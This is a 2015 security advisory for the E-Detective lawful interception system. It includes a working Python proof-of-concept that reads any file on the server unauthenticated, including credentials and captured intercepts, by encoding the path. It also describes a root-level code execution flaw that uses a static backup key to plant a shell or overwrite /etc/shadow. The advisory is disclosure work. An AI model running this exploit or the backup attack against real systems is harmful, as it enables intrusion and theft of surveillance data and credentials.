@@ -1,0 +1,107 @@
+Advisory:  E-Detective Lawful Interception System
+    multiple security vulnerabilities
+Date:    14/06/2015
+CVE:    unassigned
+Authors:  Mustafa Al-Bassam (https://musalbas.com)
+    slipstream/RoL (https://twitter.com/TheWack0lian)
+Software:  Decision Group E-Detective Lawful Interception System
+Vendor URL:  http://www.edecision4u.com/
+
+Software description:
+
+"E-Detective is a real-time Internet interception, monitoring and
+forensics system that captures, decodes, and reconstructs various types
+of Internet traffic. It is commonly used for organization Internet
+behavioural monitoring, auditing, record keeping, forensics analysis, and
+investigation, as well as, legal and lawful interception for lawful
+enforcement agencies such as Police Intelligence, Military Intelligence,
+Cyber Security Departments, National Security Agencies, Criminal
+Investigation Agencies, Counter Terrorism Agencies etc."
+
+Vulnerabilities:
+
+1) Unauthenticated Local File Disclosure
+
+-----
+Proof-of-concept:
+https://github.com/musalbas/edetective-poc/blob/master/pwned-detective.py
+
+# Proof-of-concept for unauthenticated LFD in E-Detective.
+# Authors: Mustafa Al-Bassam (https://musalbas.com)
+#          slipstream/RoL (https://twitter.com/TheWack0lian)
+
+import argparse
+import base64
+import urllib2
+
+
+def display_banner():
+    print """
+                              _        
+                             | |       
+ _ ____      ___ __   ___  __| |______ 
+| '_ \ \ /\ / / '_ \ / _ \/ _` |______|
+| |_) \ V  V /| | | |  __/ (_| |       
+| .__/ \_/\_/ |_| |_|\___|\__,_|       
+| |                                    
+|_|                                    
+     _      _            _   _           
+    | |    | |          | | (_)          
+  __| | ___| |_ ___  ___| |_ ___   _____ 
+ / _` |/ _ \ __/ _ \/ __| __| \ \ / / _ \\
+| (_| |  __/ ||  __/ (__| |_| |\ V /  __/
+ \__,_|\___|\__\___|\___|\__|_| \_/ \___|
+"""
+
+argparser = argparse.ArgumentParser(description='Proof-of-concept for unauthenticated LFD in E-Detective.')
+argparser.add_argument('hostname', help='hostname to pwn')
+argparser.add_argument('file', help='path to file on server to grab')
+
+
+def encode(text):
+    encoded = ''
+
+    for i in range(len(text)):
+        encoded += chr(ord(text[i]) + 40)
+
+    encoded = base64.b64encode(encoded)
+    return encoded
+
+
+def poc(hostname, file):
+    return http_read('https://' + hostname + '/common/download.php?file=' + encode(file))
+
+
+def http_read(url):
+    return urllib2.urlopen(url).read()
+
+if __name__ == "__main__":
+    display_banner()
+    args = argparser.parse_args()
+    print poc(args.hostname, args.file)
+
+
+-----
+
+
+
+The /common/download.php in the web root allows for an unauthenticated
+user to read any file on the system that the web user has access to.
+This includes database credentials and any traffic intercepts captured
+by the system.
+
+The "file" parametre is "protected" by inadequate "cipher": base64
+followed by rot40, which is trivially reversible.
+
+2) Authenticated Remote Code Execution
+
+The restore feature in the "config backup" page extracts a .tar file
+encrypted with OpenSSL blowfish into the root directory (/) as root.
+
+The .tar file should be encrypted with the static key "/tmp/.charlie".
+Yes, that's the actual key - they pass the wrong argument to OpenSSL.
+They used -k instead of -kfile, thus the key is the path of the key file
+rather than the contents of the key file.
+
+This enables an attacker to upload a shell into the web root, or
+overwrite any system files such as /etc/shadow.
